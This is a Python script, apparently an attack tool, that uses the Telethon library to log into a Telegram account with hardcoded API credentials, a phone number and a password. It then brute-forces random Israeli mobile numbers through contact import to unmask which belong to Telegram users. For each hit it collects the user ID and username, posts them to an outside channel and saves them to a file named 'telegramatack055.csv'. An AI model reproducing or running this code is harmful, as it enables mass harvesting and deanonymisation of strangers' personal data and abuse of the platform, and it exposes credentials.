from telethon.sync import TelegramClient
from telethon.tl.functions.messages import GetDialogsRequest
from telethon.tl.types import InputPeerEmpty, InputPeerChannel, InputPeerUser
from telethon.errors.rpcerrorlist import PeerFloodError, UserPrivacyRestrictedError
from telethon.tl.functions.channels import InviteToChannelRequest
from telethon.tl.functions.channels import JoinChannelRequest
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.functions.contacts import GetContactsRequest
from telethon.tl.types import InputPhoneContact
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError

from telethon import utils
import sys
import csv
import traceback
import time
import random
import datetime
import logging

logging.basicConfig(level=logging.INFO)



api_id = 1114659
api_hash = '04e6e541a5b11a3536c9faead458bf29'

phone = '+19727929484'
client = TelegramClient(phone, api_id, api_hash, auto_reconnect=True, connection_retries=9999)

client.connect()
try:
   if not client.is_user_authorized():
       client.send_code_request(phone)
       client.sign_in(phone, input('Enter the code: '))
except SessionPasswordNeededError:
    client.sign_in(password='7239')



target_group = client.get_entity('@a9b73v3dj49zsm5inh9')
client(JoinChannelRequest(target_group))


count = 0000	
for _ in range(999999):
        try:
           phone = '97253' + str(random.randrange(1111111, 9999999))
           count +=1
           client(ImportContactsRequest(
           contacts=[InputPhoneContact(
           client_id=random.randrange(123456789, 999999999),
           phone='+'+str(phone),
           first_name='b' + str(count),
           last_name='none')]))

     
           print('adding {} as {}'.format(phone, count))
           time.sleep(10)
           usertoforward = client.get_entity((phone)).username
           usertoforward1 = client.get_entity((phone))
           usertoforward2 = client.get_entity((phone)).id
           client.send_message('@a9b73v3dj49zsm5inh9',str(usertoforward1) + ' ' + str(phone))
           with open("telegramatack055.csv","a",encoding='UTF-8') as f:
              writer = csv.writer(f,delimiter=",",lineterminator="\n")
              writer.writerow(['phone', 'id', 'username'])
              print('msg send')
              print('round number: ' + str(count))
              writer.writerow([phone, usertoforward2, usertoforward])
        except ValueError:
            print('no entity found')
            continue
        except:
            traceback.print_exc()  
            continue






